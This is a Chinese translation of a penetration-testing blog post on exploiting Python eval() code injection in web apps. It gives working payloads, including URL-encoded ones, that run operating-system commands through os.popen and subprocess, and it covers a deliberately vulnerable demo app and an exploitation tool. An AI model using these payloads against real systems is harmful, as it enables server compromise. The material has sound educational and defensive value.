> 原文链接: https://www.anquanke.com//post/id/84891 


# 【技术分享】	利用Python代码实现Web应用的注入


                                阅读量   
                                **149679**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：sethsec
                                <br>原文地址：[http://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html](http://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01ca83beb980f9ea38.png)](https://p5.ssl.qhimg.com/t01ca83beb980f9ea38.png)

****

**翻译：**[**WisFree**](http://bobao.360.cn/member/contribute?uid=2606963099)

**稿费：200RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**



**漏洞概述**

如果你的Web应用中存在Python代码注入漏洞的话，攻击者就可以利用你的Web应用来向你后台服务器的Python解析器发送恶意Python代码了。这也就意味着，如果你可以在目标服务器中执行Python代码的话，你就可以通过调用服务器的操作系统的指令来实施攻击了。通过运行操作系统命令，你不仅可以对那些可以访问到的文件进行读写操作，甚至还可以启动一个远程的交互式Shell（例如nc、Metasploit和Empire）。

为了复现这个漏洞，我在最近的一次外部渗透测试过程中曾尝试去利用过这个漏洞。当时我想在网上查找一些关于这个漏洞具体应用方法的信息，但是并没有找到太多有价值的内容。在同事Charlie Worrell（[@decidedlygray](https://twitter.com/decidedlygray)）的帮助下，我们成功地通过Burp POC实现了一个非交互式的shell，这也是我们这篇文章所要描述的内容。

因为除了Python之外，还有很多其他的语言（例如Perl和Ruby）也有可能出现代码注入问题，因此Python代码注入属于服务器端代码注入的一种。实际上，如果各位同学和我一样是一名CWE的关注者，那么下面这两个CWE也许可以给你提供一些有价值的参考内容：

1. [CWE-94：代码生成控制不当（‘代码注入’）](https://cwe.mitre.org/data/definitions/94.html)

2. [CWE-95：动态代码评估指令处理不当（‘Eval注入’](https://cwe.mitre.org/data/definitions/95.html)）

<br>

**漏洞利用**

假设你现在使用Burp或者其他工具发现了一个Python注入漏洞，而此时的漏洞利用Payload又如下所示：

```
eval(compile('for x in range(1):n import timen time.sleep(20)','a','single'))
```

那么你就可以使用下面这个Payload来在目标主机中实现操作系统指令注入了：

```
eval(compile("""for x in range(1):\n import os\n os.popen(r'COMMAND').read()""",'','single'))
```

实际上，你甚至都不需要使用for循环，直接使用全局函数“__import__”就可以了。具体代码如下所示：

```
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
```

其实我们的Payload代码还可以更加简洁，既然我们已经将import和popen写在了一个表达式里面了，那么在大多数情况下，你甚至都不需要使用compile了。具体代码如下所示：

```
__import__('os').popen('COMMAND').read()
```

为了将这个Payload发送给目标Web应用，你需要对其中的某些字符进行URL编码。为了节省大家的时间，我们在这里已经将上面所列出的Payload代码编码完成了，具体如下所示：

```
param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
```

```
param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
```

接下来，我们将会给大家介绍关于这个漏洞的细节内容，并跟大家分享一个包含这个漏洞的Web应用。在文章的结尾，我将会给大家演示一款工具，这款工具是我和我的同事Charlie共同编写的，它可以明显降低你在利用这个漏洞时所花的时间。简而言之，这款工具就像sqlmap一样，可以让你快速找到SQL注入漏洞，不过这款工具仍在起步阶段，感兴趣的同学可以在项目的GitHub主页[[传送门]](https://github.com/sethsec/PyCodeInjection)中与我交流一下。

<br>

**搭建一个包含漏洞的服务器**

为了更好地给各位同学进行演示，我专门创建了一个包含漏洞的Web应用。如果你想要自己动手尝试利用这个漏洞的话，你可以点击[这里](https://github.com/sethsec/PyCodeInjection)获取这份Web应用。接下来，我们要配置的就是Web应用的运行环境，即通过pip或者easy_install来安装web.py。它可以作为一台独立的服务器运行，或者你也可以将它加载至包含mod_wsgi模块的Apache服务器中。相关操作指令如下所示：

```
git clone https://github.com/sethsec/PyCodeInjection.git
cd VulnApp
./install_requirements.sh
python PyCodeInjectionApp.py
```

**<br>**

**漏洞分析**

当你在网上搜索关于python的eval()函数时，几乎没有文章会提醒你这个函数是非常不安全的，而eval()函数就是导致这个Python代码注入漏洞的罪魁祸首。如果你遇到了下面这两种情况，说明你的Web应用中存在这个漏洞：

1. Web应用接受用户输入（例如GET/POST参数，cookie值）；

2. Web应用使用了一种不安全的方法来将用户的输入数据传递给eval()函数（没有经过安全审查，或者缺少安全保护机制）；

下图所示的是一份包含漏洞的示例代码：

[![](https://p1.ssl.qhimg.com/t01011586da04678cbc.png)](https://p1.ssl.qhimg.com/t01011586da04678cbc.png)

大家可以看到，eval()函数是上述代码中唯一一个存在问题的地方。除此之外，如果开发人员直接对用户的输入数据（序列化数据）进行拆封的话，那么Web应用中也将会出现这个漏洞。

不过需要注意的是，除了eval()函数之外，Python的exec()函数也有可能让你的Web应用中出现这个漏洞。而且据我所示，现在很多开发人员都会在Web应用中不规范地使用exec()函数，所以这个问题肯定会存在。

<br>

**自动扫描漏洞**

为了告诉大家如何利用漏洞来实施攻击，我通常会使用扫描器来发现一些我此前没有见过的东西。找到之后，我再想办法将毫无新意的PoC开发成一个有意义的exploit。不过我想提醒大家的是，不要过度依赖扫描工具，因为还很多东西是扫描工具也找不到的。

这个漏洞也不例外，如果你在某个Web应用中发现了这个漏洞，那么你肯定使用了某款自动化的扫描工具，比如说Burp Suite Pro。目前为止，如果不使用类似Burp Suite Pro这样的专业扫描工具，你几乎是无法发现这个漏洞的。

当你搭建好测试环境之后，启动并运行包含漏洞的示例应用。接下来，使用Burp Suite Pro来对其进行扫描。扫描结果如下图所示：

[![](https://p4.ssl.qhimg.com/t0163a320bbdf20fff3.png)](https://p4.ssl.qhimg.com/t0163a320bbdf20fff3.png)

下图显示的是Burp在扫描这个漏洞时所使用的Payload：

[![](https://p0.ssl.qhimg.com/t01275f85335153ef81.png)](https://p0.ssl.qhimg.com/t01275f85335153ef81.png)

我们可以看到，Burp之所以要将这个Web应用标记为“Vulnerable”（包含漏洞的），是因为当它将这个Payload发送给目标Web应用之后，服务器的Python解析器休眠了20秒，响应信息在20秒之后才成功返回。但我要提醒大家的是，这种基于时间的漏洞检查机制通常会存在一定的误报。

**<br>**

**将PoC升级成漏洞利用代码**

使用time.sleep()来验证漏洞的存在的确是一种很好的方法。接下来，为了执行操作系统指令并接收相应的输出数据，我们可以使用os.popen()、subprocess.Popen()、或者subprocess.check_output()这几个函数。当然了，应该还有很多其他的函数同样可以实现我们的目标。

因为eval()函数只能对表达式进行处理，因此Burp Suite Pro的Payload在这里使用了compile()函数，这是一种非常聪明的做法。当然了，我们也可以使用其他的方法来实现，例如使用全局函数“__import__”。关于这部分内容请查阅参考资料：[[参考资料1]](http://www.floyd.ch/?p=584)[[参考资料2]](http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html)

下面这个Payload应该可以适用于绝大多数的场景：

```
# Example with one expression
__import__('os').popen('COMMAND').read()
# Example with multiple expressions, separated by commas
str("-"*50),__import__('os').popen('COMMAND').read()
```

如果你需要执行一个或多个语句，那么你就需要使用eval()或者compile()函数了。实现代码如下所示：

```
# Examples with one expression
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True)""",'','single'))
#Examples with multiple statements, separated by semicolons
eval(compile("""__import__('os').popen(r'COMMAND').read();import time;time.sleep(2)""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True);import time;time.sleep(2)""",'','single'))
```

在我的测试过程中，有时全局函数“__import__”会不起作用。在这种情况下，我们就要使用for循环了。相关代码如下所示：

```
eval(compile("""for x in range(1):n import osn os.popen(r'COMMAND').read()""",'','single'))
```

```
eval(compile("""for x in range(1):n import subprocessn subprocess.Popen(r'COMMAND',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
```

```
eval(compile("""for x in range(1):n import subprocessn subprocess.check_output(r'COMMAND',shell=True)""",'','single'))
```

如果包含漏洞的参数是一个GET参数，那么你就可以直接在浏览器中利用这个漏洞了：

[![](https://p1.ssl.qhimg.com/t019aa9582743f08d14.png)](https://p1.ssl.qhimg.com/t019aa9582743f08d14.png)

请注意：虽然浏览器会帮你完成绝大部分的URL编码工作，但是你仍然需要对分号（%3b）和空格(%20)进行手动编码。除此之外，你也可以直接使用我们所开发的工具。

如果是POST参数的话，我建议各位直接使用类似Burp Repeater这样的工具。如下图所示，我在subprocess.check_output()函数中一次性调用了多个系统命令，即pwd、ls、-al、whoami和ping。

[![](https://p0.ssl.qhimg.com/t014e2504ef3b827c85.png)](https://p0.ssl.qhimg.com/t014e2504ef3b827c85.png)

[![](https://p1.ssl.qhimg.com/t017ff984a5fb8631af.png)](https://p1.ssl.qhimg.com/t017ff984a5fb8631af.png)

<br>

**漏洞利用工具-PyCodeInjectionShell**

你可以直接访问[PyCodeInjectionShell的GitHub主页](https://github.com/sethsec/PyCodeInjection)获取工具源码，我们也提供了相应的工具使用指南。在你使用这款工具的过程中会感觉到，它跟sqlmap一样使用起来非常的简单。除此之外，它的使用方法跟sqlmap基本相同。

[![](https://p3.ssl.qhimg.com/t0146440c26c12f482e.png)](https://p3.ssl.qhimg.com/t0146440c26c12f482e.png)

[![](https://p4.ssl.qhimg.com/t01d5eeb6975b56fc20.png)](https://p4.ssl.qhimg.com/t01d5eeb6975b56fc20.png)

<br>

**结束语**

如果各位对本项目有任何的建议或者疑问的话，欢迎各位同学在GitHub上与我互动。
